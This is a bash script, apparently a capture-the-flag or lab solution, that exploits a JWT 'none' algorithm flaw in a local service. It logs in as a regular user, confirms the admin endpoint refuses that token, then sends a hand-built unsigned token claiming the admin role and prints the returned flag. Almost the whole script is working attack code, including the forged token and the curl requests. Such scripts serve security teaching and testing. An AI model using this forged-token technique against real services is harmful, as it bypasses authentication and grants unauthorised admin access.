#!/bin/bash
echo "=== JWT None Algorithm Exploitation ==="
echo ""

BASE_URL="http://localhost:4004"

echo "[*] Step 1: Login as regular user..."
LOGIN_RESP=$(curl -s -X POST "$BASE_URL/api/login" -H 'Content-Type: application/json' -d '{"username":"alice"}')
echo "$LOGIN_RESP" | jq .
TOKEN=$(echo "$LOGIN_RESP" | jq -r '.token')
echo ""

echo "[*] Step 2: Try to access admin flag with regular token (should fail)..."
curl -s -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/admin/flag" | jq .
echo ""

echo "[*] Step 3: Create forged JWT with algorithm='none' and role='admin'..."
# Header: {"alg":"none","typ":"JWT"} = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"username":"admin","role":"admin","user_id":"admin"} = eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6ImFkbWluIn0
FORGED_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6ImFkbWluIn0."
echo "Forged JWT: $FORGED_JWT"
echo ""

echo "[*] Step 4: Access admin endpoint with forged JWT..."
RESPONSE=$(curl -s -H "Authorization: Bearer $FORGED_JWT" "$BASE_URL/api/admin/flag")
echo "$RESPONSE" | jq .
echo ""

FLAG=$(echo "$RESPONSE" | jq -r '.flag')
echo "ðŸš© FLAG: $FLAG"
